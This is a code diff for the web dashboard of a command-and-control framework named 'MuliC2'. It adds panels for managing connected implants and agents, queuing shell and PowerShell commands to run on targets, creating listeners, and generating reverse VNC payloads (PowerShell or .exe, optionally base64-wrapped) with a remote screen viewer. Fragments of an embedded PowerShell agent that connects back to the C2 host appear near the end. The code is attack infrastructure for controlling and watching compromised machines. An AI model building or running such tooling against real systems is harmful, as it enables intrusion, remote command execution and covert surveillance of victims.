@@ -1,3 +1,521 @@
+<template>
+  <div class="dashboard">
+    <!-- Overview Panel -->
+    <div class="overview-panel">
+      <h2 class="panel-title">Overview</h2>
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-icon">
+            <el-icon size="24" color="#67C23A"><Monitor /></el-icon>
+          </div>
+          <div class="stat-content">
+            <div class="stat-number">{{ stats.totalImplants }}</div>
+            <div class="stat-label">Total Connected Implants</div>
+          </div>
+        </div>
+        
+        <div class="stat-card">
+          <div class="stat-icon">
+            <el-icon size="24" color="#409EFF"><Connection /></el-icon>
+          </div>
+          <div class="stat-content">
+            <div class="stat-number">{{ stats.activeListeners }}</div>
+            <div class="stat-label">Active Listeners</div>
+          </div>
+    </div>
+
+        <div class="stat-card">
+          <div class="stat-icon">
+            <el-icon size="24" color="#E6A23C"><List /></el-icon>
+          </div>
+          <div class="stat-content">
+            <div class="stat-number">{{ stats.runningTasks }}</div>
+            <div class="stat-label">Tasks Running</div>
+          </div>
+        </div>
+        
+        <div class="stat-card">
+          <div class="stat-icon">
+            <el-icon size="24" color="#F56C6C"><Clock /></el-icon>
+          </div>
+          <div class="stat-content">
+            <div class="stat-number">{{ stats.lastCheckin }}</div>
+            <div class="stat-label">Last Check-in</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Main Dashboard Tabs -->
+    <el-tabs v-model="activeTab" type="card" class="dashboard-tabs">
+      <!-- Implants Panel -->
+      <el-tab-pane label="Implants" name="implants">
+        <div class="implants-panel">
+          <div class="panel-header">
+            <h3>Connected Implants</h3>
+            <el-button type="primary" size="small" @click="refreshImplants">
+              <el-icon><Refresh /></el-icon>
+              Refresh
+            </el-button>
+          </div>
+          
+          <div v-if="implants.length === 0" class="empty-state">
+            <el-icon size="64" color="#909399"><Connection /></el-icon>
+            <h3>No Implants Connected</h3>
+            <p>When implants connect to your listeners, they will appear here.</p>
+          </div>
+          
+          <el-table v-else :data="implants" style="width: 100%" class="implants-table">
+            <el-table-column prop="name" label="Name/Hostname" width="200" />
+            <el-table-column prop="ip" label="IP Address" width="150" />
+            <el-table-column prop="type" label="Type" width="120">
+              <template #default="scope">
+                <el-tag :type="getImplantTypeColor(scope.row.type)">
+                  {{ scope.row.type }}
+                </el-tag>
+              </template>
+            </el-table-column>
+            <el-table-column prop="language" label="Language" width="120" />
+            <el-table-column prop="status" label="Status" width="100">
+              <template #default="scope">
+                <el-tag :type="scope.row.status === 'online' ? 'success' : 'danger'">
+                  {{ scope.row.status }}
+                </el-tag>
+              </template>
+            </el-table-column>
+            <el-table-column prop="lastCheckin" label="Last Check-in" width="180" />
+            <el-table-column label="Actions" width="200">
+              <template #default="scope">
+                <el-button size="small" @click="selectImplant(scope.row)">
+                  <el-icon><Select /></el-icon>
+                  Select
+                </el-button>
+                <el-button size="small" type="warning" @click="disconnectImplant(scope.row)">
+                  <el-icon><Close /></el-icon>
+                  Disconnect
+                </el-button>
+              </template>
+            </el-table-column>
+          </el-table>
+        </div>
+      </el-tab-pane>
+
+      <!-- Tasks Panel -->
+      <el-tab-pane label="Tasks" name="tasks">
+        <div class="tasks-panel">
+          <div class="panel-header">
+            <h3>Command Queue & Task Management</h3>
+            <div class="task-controls">
+              <el-select v-model="selectedImplant" placeholder="Select Implant" style="width: 200px; margin-right: 10px;">
+                <el-option
+                  v-for="implant in onlineImplants"
+                  :key="implant.id"
+                  :label="`${implant.name} (${implant.ip})`"
+                  :value="implant.id"
+                />
+              </el-select>
+              <el-button type="primary" @click="showCommandDialog" :disabled="!selectedImplant">
+                <el-icon><Plus /></el-icon>
+                Send Command
+              </el-button>
+            </div>
+          </div>
+          
+          <div v-if="tasks.length === 0" class="empty-state">
+            <el-icon size="64" color="#909399"><List /></el-icon>
+            <h3>No Tasks Available</h3>
+            <p>Select an implant and send commands to create tasks.</p>
+          </div>
+          
+          <el-table v-else :data="tasks" style="width: 100%" class="tasks-table">
+            <el-table-column prop="id" label="Task ID" width="100" />
+            <el-table-column prop="implantName" label="Implant" width="150" />
+            <el-table-column prop="command" label="Command" width="300" />
+            <el-table-column prop="status" label="Status" width="100">
+              <template #default="scope">
+                <el-tag :type="getTaskStatusColor(scope.row.status)">
+                  {{ scope.row.status }}
+                </el-tag>
+              </template>
+            </el-table-column>
+            <el-table-column prop="createdAt" label="Created" width="180" />
+            <el-table-column prop="output" label="Output" width="200">
+              <template #default="scope">
+                <el-button size="small" @click="viewTaskOutput(scope.row)" v-if="scope.row.output">
+                  <el-icon><View /></el-icon>
+                  View
+                </el-button>
+                <span v-else>-</span>
+              </template>
+            </el-table-column>
+            <el-table-column label="Actions" width="150">
+              <template #default="scope">
+                <el-button size="small" type="danger" @click="cancelTask(scope.row)" v-if="scope.row.status === 'running'">
+                  <el-icon><Close /></el-icon>
+                  Cancel
+                </el-button>
+              </template>
+            </el-table-column>
+          </el-table>
+        </div>
+      </el-tab-pane>
+
+      <!-- Listeners Panel -->
+      <el-tab-pane label="Listeners" name="listeners">
+        <div class="listeners-panel">
+          <div class="panel-header">
+            <h3>Listener Profiles</h3>
+            <el-button type="primary" @click="showCreateListenerDialog">
+              <el-icon><Plus /></el-icon>
+              Create New Listener
+            </el-button>
+          </div>
+          
+          <div v-if="listeners.length === 0" class="empty-state">
+            <el-icon size="64" color="#909399"><Setting /></el-icon>
+            <h3>No Listener Profiles</h3>
+            <p>Create a listener profile to start accepting connections.</p>
+          </div>
+          
+          <el-table v-else :data="listeners" style="width: 100%" class="listeners-table">
+            <el-table-column prop="name" label="Profile Name" width="150" />
+            <el-table-column prop="protocol" label="Protocol" width="100" />
+            <el-table-column prop="host" label="Host" width="150" />
+            <el-table-column prop="port" label="Port" width="100" />
+            <el-table-column prop="isActive" label="Status" width="100">
+              <template #default="scope">
+                <el-tag :type="scope.row.isActive ? 'success' : 'info'">
+                  {{ scope.row.isActive ? 'Active' : 'Inactive' }}
+                </el-tag>
+              </template>
+            </el-table-column>
+            <el-table-column prop="connections" label="Connections" width="100" />
+            <el-table-column prop="createdAt" label="Created" width="180" />
+            <el-table-column label="Actions" width="200">
+              <template #default="scope">
+                <el-button size="small" @click="startListener(scope.row)" v-if="!scope.row.isActive">
+                  <el-icon><CaretRight /></el-icon>
+                  Start
+                </el-button>
+                <el-button size="small" type="warning" @click="stopListener(scope.row)" v-if="scope.row.isActive">
+                  <el-icon><CaretLeft /></el-icon>
+                  Stop
+                </el-button>
+                <el-button size="small" type="danger" @click="deleteListener(scope.row)" v-if="!scope.row.isActive">
+                  <el-icon><Delete /></el-icon>
+                  Delete
+                </el-button>
+              </template>
+            </el-table-column>
+          </el-table>
+        </div>
+      </el-tab-pane>
+
+      <!-- Agents Panel -->
+      <el-tab-pane label="Agents" name="agents">
+        <div class="agents-panel">
+          <div class="panel-header">
+            <h3>Agent Management</h3>
+            <p>Manage and monitor connected agents</p>
+          </div>
+          
+          <div v-if="agents.length === 0" class="empty-state">
+            <el-icon size="64" color="#909399"><User /></el-icon>
+            <h3>No Agents Connected</h3>
+            <p>When agents connect to your listeners, they will appear here.</p>
+          </div>
+          
+          <el-table v-else :data="agents" style="width: 100%" class="agents-table">
+            <el-table-column prop="hostname" label="Hostname" width="200" />
+            <el-table-column prop="ip" label="IP Address" width="150" />
+            <el-table-column prop="username" label="User" width="120" />
+            <el-table-column prop="os" label="OS" width="100" />
+            <el-table-column prop="status" label="Status" width="100">
+              <template #default="scope">
+                <el-tag :type="scope.row.status === 'online' ? 'success' : 'danger'">
+                  {{ scope.row.status }}
+                </el-tag>
+              </template>
+            </el-table-column>
+            <el-table-column prop="lastSeen" label="Last Seen" width="180" />
+            <el-table-column label="Actions" width="200">
+              <template #default="scope">
+                <el-button size="small" @click="selectAgent(scope.row)">
+                  <el-icon><Select /></el-icon>
+                  Select
+            </el-button>
+                <el-button size="small" type="warning" @click="disconnectAgent(scope.row)">
+                  <el-icon><Close /></el-icon>
+                  Disconnect
+                </el-button>
+              </template>
+            </el-table-column>
+          </el-table>
+          </div>
+      </el-tab-pane>
+
+
+
+      <!-- VNC Panel - Reverse VNC Payload Generator & Viewer -->
+      <el-tab-pane label="VNC" name="vnc">
+        <div class="vnc-panel">
+          <div class="panel-header">
+            <h3>Reverse VNC System</h3>
+            <p>Generate VNC payloads and control remote screens</p>
+          </div>
+          
+          <!-- VNC Configuration Form -->
+          <div class="vnc-generator">
+            <el-form :model="vncForm" label-width="150px" class="vnc-form">
+              <el-row :gutter="20">
+                <el-col :span="12">
+                  <el-form-item label="Target Listener:">
+                    <el-select v-model="selectedListenerId" placeholder="Select active HTTPS listener" style="width: 100%" @change="updateVncFormFromListener">
+                      <el-option
+                        v-for="listener in activeHTTPSListeners"
+                        :key="listener.id"
+                        :label="`${listener.name} (${listener.host}:${listener.port})`"
+                        :value="listener.id"
+                      />
+                    </el-select>
+                    <span class="form-help">Choose which HTTPS listener the VNC payload connects to</span>
+                  </el-form-item>
+                </el-col>
+                <el-col :span="12">
+                  <el-form-item label="Connection Info:">
+                    <div class="connection-info">
+                      <p><strong>Target:</strong> {{ selectedListener ? `${selectedListener.host === '0.0.0.0' ? (getCurrentHostname()) : selectedListener.host}:${selectedListener.port}` : 'No listener selected' }}</p>
+                    </div>
+                  </el-form-item>
+                </el-col>
+              </el-row>
+              
+              <el-row :gutter="20">
+                <el-col :span="12">
+                  <el-form-item label="Payload Type:">
+                    <el-select v-model="vncForm.payloadType" placeholder="Select payload type">
+                      <el-option label="PowerShell" value="powershell" />
+                      <el-option label="Executable (.exe)" value="exe" />
+                    </el-select>
+                  </el-form-item>
+                </el-col>
+                <el-col :span="12">
+                  <el-form-item label="Use Loader:">
+                    <el-switch v-model="vncForm.useLoader" />
+                    <span class="form-help">Apply base64 encoding wrapper</span>
+                  </el-form-item>
+                </el-col>
+              </el-row>
+              
+              <el-form-item>
+                <el-button type="primary" @click="generateVncPayload" :loading="generatingVnc">
+                  <el-icon><Setting /></el-icon>
+                  Generate VNC Payload
+                </el-button>
+                <el-button type="warning" @click="clearVncForm">
+                  <el-icon><Delete /></el-icon>
+                  Clear
+                </el-button>
+                <el-button type="info" @click="autoFillVncFromConfig">
+                  <el-icon><Connection /></el-icon>
+                  Use Server Config
+                </el-button>
+                <el-button type="success" @click="refreshListeners">
+                  <el-icon><Refresh /></el-icon>
+                  Refresh Listeners
+                </el-button>
+              </el-form-item>
+            </el-form>
+          </div>
+          
+          <!-- Generated VNC Payload Output -->
+          <div v-if="generatedVncPayload" class="vnc-output">
+            <h3>Generated VNC Payload:</h3>
+            <div class="vnc-info">
+              <p><strong>Target Listener:</strong> {{ selectedListener ? selectedListener.name : 'None' }}</p>
+              <p><strong>Connection:</strong> {{ selectedListener ? `${selectedListener.host === '0.0.0.0' ? getCurrentHostname() : selectedListener.host}:${selectedListener.port}` : 'None' }}</p>
+              <p><strong>Type:</strong> {{ vncForm.payloadType }}</p>
+              <p><strong>Loader:</strong> {{ vncForm.useLoader ? 'Enabled' : 'Disabled' }}</p>
+              <p><strong>Generated:</strong> {{ new Date().toLocaleString() }}</p>
+            </div>
+            <div class="code-container">
+              <el-input
+                v-model="generatedVncPayload"
+                type="textarea"
+                :rows="12"
+                readonly
+                class="vnc-code"
+              />
+              <div class="code-actions">
+                <el-button type="success" @click="copyVncPayload">
+                  <el-icon><CopyDocument /></el-icon>
+                  Copy Payload
+                </el-button>
+                <el-button type="warning" @click="downloadVncPayload">
+                  <el-icon><Download /></el-icon>
+                  Download as .ps1
+                </el-button>
+
+              </div>
+            </div>
+          </div>
+          
+          <!-- VNC Viewer & Control Section -->
+          <div class="vnc-viewer">
+            <h3>VNC Viewer & Control</h3>
+            <p>Monitor and control remote screens from connected VNC agents</p>
+            
+            <div class="vnc-status">
+              <div class="status-indicator">
+                <span class="status-dot" :class="{ active: vncConnected }"></span>
+                <span class="status-text">{{ vncConnected ? 'VNC Agent Connected' : 'No VNC Agent Connected' }}</span>
+              </div>
+              <div v-if="vncConnected" class="connection-info">
+                <p><strong>Agent:</strong> {{ vncAgentInfo.hostname || 'Unknown' }}</p>
+                <p><strong>IP:</strong> {{ vncAgentInfo.ip || 'Unknown' }}</p>
+                <p><strong>Resolution:</strong> {{ vncAgentInfo.resolution || '200x150' }}</p>
+                <p><strong>FPS:</strong> {{ vncAgentInfo.fps || '5' }}</p>
+                <p><strong>Frames Received:</strong> {{ vncFrameCount }}</p>
+              </div>
+            </div>
+            
+            <div v-if="vncConnected" class="vnc-controls">
+              <div class="control-buttons">
+                <el-button type="primary" @click="startVncViewer" :disabled="vncViewerActive">
+                  <el-icon><VideoPlay /></el-icon>
+                  Start Viewer
+                  </el-button>
+                <el-button type="warning" @click="stopVncViewer" :disabled="!vncViewerActive">
+                  <el-icon><VideoPause /></el-icon>
+                  Stop Viewer
+      </el-button>
+                <el-button type="success" @click="captureScreenshot" :disabled="!vncViewerActive">
+                  <el-icon><Camera /></el-icon>
+                  Capture Screenshot
+                </el-button>
+                <el-button type="info" @click="toggleFullscreen" :disabled="!vncViewerActive">
+                  <el-icon><FullScreen /></el-icon>
+                  Fullscreen
+                </el-button>
+          </div>
+              
+              <div class="vnc-settings">
+                <el-form :model="vncSettings" label-width="120px" size="small">
+                  <el-form-item label="Quality:">
+                    <el-slider v-model="vncSettings.quality" :min="1" :max="10" :step="1" />
+                  </el-form-item>
+                  <el-form-item label="FPS Limit:">
+                    <el-input-number v-model="vncSettings.fpsLimit" :min="1" :max="30" :step="1" />
+                  </el-form-item>
+                </el-form>
+        </div>
+            </div>
+            
+            <div v-if="vncViewerActive" class="vnc-display">
+              <canvas ref="vncCanvas" class="vnc-canvas" width="800" height="600"></canvas>
+              <div class="vnc-overlay">
+                <div class="overlay-info">
+                  <span>Resolution: {{ vncAgentInfo.resolution || '200x150' }}</span>
+                  <span>FPS: {{ vncCurrentFps }}</span>
+                  <span>Frame: {{ vncFrameCount }}</span>
+                </div>
+              </div>
+    </div>
+
+            <div v-if="!vncConnected" class="vnc-waiting">
+              <el-empty description="Waiting for VNC Agent Connection">
+                <template #description>
+                  <p>No VNC agents are currently connected.</p>
+                  <p>Deploy a VNC payload to a target system to establish connection.</p>
+                </template>
+              </el-empty>
+            </div>
+          </div>
+    </div>
+      </el-tab-pane>
+    </el-tabs>
+
+    <!-- Command Dialog -->
+    <el-dialog v-model="commandDialogVisible" title="Send Command" width="600px">
+      <el-form :model="commandForm" label-width="100px">
+        <el-form-item label="Implant:">
+          <el-input v-model="selectedImplantName" disabled />
+        </el-form-item>
+        <el-form-item label="Command:">
+          <el-input
+            v-model="commandForm.command"
+            type="textarea"
+            :rows="4"
+            placeholder="Enter command to execute on the target agent..."
+          />
+        </el-form-item>
+        <el-form-item label="Command Type:">
+          <el-select v-model="commandForm.type" placeholder="Select command type">
+            <el-option label="Shell Command" value="shell" />
+            <el-option label="PowerShell" value="powershell" />
+            <el-option label="Script" value="script" />
+          </el-select>
+        </el-form-item>
+        <el-form-item label="Schedule:">
+          <el-switch v-model="commandForm.scheduled" />
+          <span style="margin-left: 10px; color: #909399;">Schedule for later execution</span>
+        </el-form-item>
+        <el-form-item v-if="commandForm.scheduled" label="Execute At:">
+          <el-date-picker
+            v-model="commandForm.executeAt"
+            type="datetime"
+            placeholder="Select execution time"
+          />
+        </el-form-item>
+      </el-form>
+      
+      <template #footer>
+        <el-button @click="commandDialogVisible = false">Cancel</el-button>
+        <el-button type="primary" @click="sendCommand" :loading="sendingCommand">
+          Send Command
+        </el-button>
+      </template>
+    </el-dialog>
+
+    <!-- Create Listener Dialog -->
+    <el-dialog v-model="listenerDialogVisible" title="Create New Listener" width="500px">
+      <el-form :model="listenerForm" label-width="120px">
+        <el-form-item label="Profile Name:">
+          <el-input v-model="listenerForm.name" placeholder="Enter profile name" />
+        </el-form-item>
+        <el-form-item label="Protocol:">
+          <el-select v-model="listenerForm.protocol" placeholder="Select protocol">
+            <el-option label="TCP" value="tcp" />
+            <el-option label="HTTP" value="http" />
+            <el-option label="HTTPS" value="https" />
+          </el-select>
+        </el-form-item>
+        <el-form-item label="Host:">
+          <el-input v-model="listenerForm.host" placeholder="0.0.0.0" />
+        </el-form-item>
+        <el-form-item label="Port:">
+          <el-input v-model="listenerForm.port" placeholder="8080" />
+        </el-form-item>
+        <el-form-item label="Description:">
+          <el-input
+            v-model="listenerForm.description"
+            type="textarea"
+            :rows="3"
+            placeholder="Optional description"
+          />
+        </el-form-item>
+      </el-form>
+      
+      <template #footer>
+        <el-button @click="listenerDialogVisible = false">Cancel</el-button>
+        <el-button type="primary" @click="createListener" :loading="creatingListener">
+          Create Listener
+        </el-button>
+      </template>
+    </el-dialog>
+  </div>
+</template>
+
 <script setup lang="ts">
 import { ref, computed, onMounted, watch } from 'vue'
 import { ElMessage, ElMessageBox } from 'element-plus'
@@ -74,7 +592,7 @@ const listenerDialogVisible = ref(false)
 const listenerForm = ref({
   name: '',
   protocol: 'tcp',
-  host: '*',
+  host: '0.0.0.0',
   port: '8080',
   description: ''
 })
@@ -107,6 +625,10 @@ const vncSettings = ref({
   quality: 5,
   fpsLimit: 5
 })
+
+
+
+
 
 // Agent management
 const agents = ref<any[]>([])
@@ -335,19 +857,13 @@ const createListener = async () => {
   creatingListener.value = true
   
   try {
-    // Convert host format for backend
-    let backendHost = listenerForm.value.host
-    if (backendHost === '*' || backendHost === 'all' || backendHost === 'any') {
-      backendHost = '0.0.0.0'
-    }
-    
     // Create listener via API
     const response = await authenticatedFetch('/api/listeners', {
       method: 'POST',
       body: JSON.stringify({
-        name: listenerForm.value.name,
+      name: listenerForm.value.name,
         projectName: 'MuliC2',
-        host: backendHost,
+      host: listenerForm.value.host,
         port: parseInt(listenerForm.value.port),
         description: listenerForm.value.description,
         useTLS: listenerForm.value.protocol === 'https',
@@ -366,7 +882,7 @@ const createListener = async () => {
     
     ElMessage.success('Listener created successfully')
     listenerDialogVisible.value = false
-    listenerForm.value = { name: '', protocol: 'tcp', host: '*', port: '8080', description: '' }
+    listenerForm.value = { name: '', protocol: 'tcp', host: '0.0.0.0', port: '8080', description: '' }
   } catch (error) {
     console.error('Failed to create listener:', error)
     const errorMessage = error instanceof Error ? error.message : 'Unknown error'
@@ -673,7 +1189,7 @@ try {
     # Authenticate SSL connection
     try {
         \$global:sslStream.AuthenticateAsClient(\$C2Host)
-    } catch {
+  } catch {
         throw "SSL authentication failed: \$(\$_.Exception.Message)"
     }
     
@@ -763,7 +1279,7 @@ try {
 } catch {
     Write-Host "[!] Connection error: \$(\$_.Exception.Message)" -ForegroundColor Red
     Write-Host "[!] Make sure the MuliC2 listener is running on \$C2Host\`:\$C2Port" -ForegroundColor Red
-} finally {
+  } finally {
     # Final cleanup
     if (-not \$global:cleanupInProgress) {
         Invoke-GracefulCleanup \$true
@@ -779,7 +1295,7 @@ try {
         }
     } catch {}
     
-    Write-Host "[*] MuliC2 VNC agent terminated" -ForegroundColor Yellow
+            Write-Host "[*] MuliC2 VNC agent terminated" -ForegroundColor Yellow
 }`
     
     // Apply loader if enabled
